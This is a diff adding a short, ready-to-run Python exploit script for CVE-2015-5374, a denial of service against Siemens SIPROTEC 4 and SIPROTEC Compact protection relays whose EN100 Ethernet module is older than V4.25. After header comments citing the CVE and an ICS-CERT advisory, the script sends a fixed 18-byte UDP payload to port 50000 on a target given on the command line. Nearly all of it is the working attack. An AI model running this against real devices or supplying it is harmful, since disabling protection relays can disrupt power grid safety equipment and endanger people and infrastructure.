@@ -1,0 +1,31 @@
+# Exploit Title: Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module < V4.25 - Denial of Service
+# Date: 14.02.2018
+# Exploit Author: M. Can Kurnaz
+# Contact: https://twitter.com/0x43414e
+# Vendor Homepage: https://www.siemens.com
+# Version: All devices that include the EN100 Ethernet module version V4.24 or prior.
+# Tested on: Siemens SIPROTEC 4 (multiple versions < V4.25).
+# CVE : CVE-2015-5374
+# Vulnerability Details: 
+# https://www.cvedetails.com/cve/CVE-2015-5374/
+# https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01
+
+#!/usr/bin/env python
+
+import socket
+import sys
+
+print('CVE-2015-5374 Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module < V4.25 - Denial of Service')
+
+if len(sys.argv) < 2:
+	print('Usage: ' + sys.argv[0] + ' [target]')
+	sys.exit(1)
+
+print('Sending packet to ' + sys.argv[1] + ' ...')
+
+payload = bytearray('11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E'.replace(' ', '').decode('hex')) 
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(payload, (sys.argv[1], 50000))
+
+print('Done, say goodbye!')
